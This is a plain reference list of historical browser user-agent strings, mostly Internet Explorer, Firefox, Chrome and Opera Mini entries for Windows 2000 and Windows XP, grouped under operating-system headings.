		Opera/9.60 (J2ME/MIDP; Opera Mini/4.0/490; U; en) Presto/2.2.0 
		Opera/9.80 (J2ME/MIDP; Opera Mini/3.1.10423/22.387; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/1.6.0_13/22.478; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/1.6.0_13/19.916; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/1.0/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/Nokia2730c-1/22.478; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/Mozilla/23.334; U; en) Presto/2.5.25 Version/10.54


		Windows:

		Windows 2000: 
		Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0) 
		Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; DigExt) 
		Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; TUCOWS) 
		Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 ) 
		Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0) 
		Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; by TSG) 
		Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; T312461) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.00 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; TencentTraveler ) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; zh-cn) Opera 8.0 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; zh-cn) Opera 8.50 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322; FDM) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Maxthon; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MathPlayer 2.0; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; {FF0C8E09-3C86-44CB-834A-B8CEEC80A1D7}; iOpus-I-M) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; i-Nav 3.0.1.0F; .NET CLR 1.0.3705; .NET CLR 1.1.4322) 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7) Gecko/20040616 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; ja-JP; rv:1.5) Gecko/20031007 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; rv:1.7.3) Gecko/20040913 Firefox/0.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; rv:1.7.3) Gecko/20041001 Firefox/0.10.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; ja-JP; m18) Gecko/20010131 Netscape6/6.01 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.5) Gecko/20041108 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.5) Gecko/20041122 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-GB; rv:1.7.5) Gecko/20041107 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-GB; rv:1.7.5) Gecko/20041110 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; fr-FR; rv:1.7.5) Gecko/20041108 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; it-IT; rv:1.7.5) Gecko/20041110 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8b) Gecko/20050118 Firefox/1.0+ 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0 
		Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.55 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13

		windows XP: 
		Mozilla/4.8 [en] (Windows NT 5.1; U) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1); 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FDM; 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MyIE2) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; BrowserBob) 
		Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Alexa Toolbar) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; TencentTraveler) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.0 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.01 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.50 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 2.0.40607) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; DFO-MPO Internet Explorer 6.0) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; iebar; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.40607) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; NOKTURNAL KICKS ASS) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; .NET CLR 1.1.4322; .NET CLR 2.0.41115) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ENGINE; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT)) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) 
		Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt); Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1); 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ESB{F40811EE-DF17-4BC9-8785-B362ABF34098}; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.40607; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FDM) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FTDv3 Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.40607) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; AtHome033) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; HCI0449; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; i-NavFourF; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon; 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; Maxthon; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; FunWebProducts; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Woningstichting Den Helder; .NET CLR 1.0.3705) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 2.0.50727; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727) 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648) 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; InfoPath.1 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; EasyBits GO v1.0; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E) 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.800) AppleWebKit/534.6 (KHTML, like Gecko) Version/5.0 Safari/534.6.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.48 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.33 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.55 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.151 Safari/534.16 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 ChromePlus/1.6.3.1 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Lunascape 5.0 alpha2) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Lunascape 5.0 alpha2) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Tablet PC 2.0; Lunascape 5.0 alpha2) 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:0.9.4.1) Gecko/20020508 Netscape6/6.2.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.4) Gecko/20030624 Netscape/7.1 (ax) 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax) 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax) 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6) Gecko/20040113 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20041001 Firefox/0.10.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.6) Gecko/20040206 Firefox/0.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040614 Firefox/0.9 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040707 Firefox/0.9.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/0.9.2 StumbleUpon/1.994 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040803 Firefox/0.9.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.5) Gecko/20041107 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.5) Gecko/20041108 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.5) Gecko/20041122 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.5) Gecko/20041110 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 StumbleUpon/1.999 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.7.5) Gecko/20041210 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.7.5) Gecko/20041108 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b) Gecko/20050118 Firefox/1.0+ 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.340) AppleWebKit/530+ (KHTML, like Gecko) Version/4.0 Safari/530.17 UNTRUSTED/1.0 3gpp-gba 
		Mozilla/5.0 (Windows NT 5.1; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1 
		Mozilla/5.0 (Windows NT 5.1; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0 
		Mozilla/5.0 (Windows NT 5.1; rv:2.0b6pre) Gecko/20100902 Firefox/4.0b6pre Fennec/2.0b1pre 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20090317 Fennec/1.0b1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1 
		Mozilla/5.0 (Windows; Windows; U; Windows NT 5.1; Windows CE 5.2; rv:1.8.1.4pre) Gecko/20070327 Minimo/0.020 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.810.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.809.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.724.100 Safari/534.30 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.706.0 Safari/534.25 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.704.0 Safari/534.25 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.700.3 Safari/534.24 
		Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.43 Safari/534.24 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.682.0 Safari/534.21 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.19 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.18 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.634.0 Safari/534.16 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.602.0 Safari/534.14 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.600.0 Safari/534.14 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.599.0 Safari/534.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13 
		Mozilla/5.0 (Windows U Windows NT 5.1 en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.583.0 Safari/534.12 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.548.0 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.9 (KHTML, like Gecko) Chrome/7.0.531.0 Safari/534.9 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/7.0.0 Safari/700.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.53 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.8 (KHTML, like Gecko) Chrome/6.0.397.0 Safari/533.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.357.0 Safari/533.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.356.0 Safari/533.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.355.0 Safari/533.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.288.1 Safari/532.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.4 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.3 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) Chrome/4.0.223.3 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.7 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.0 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.5 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.4 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.0 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0 
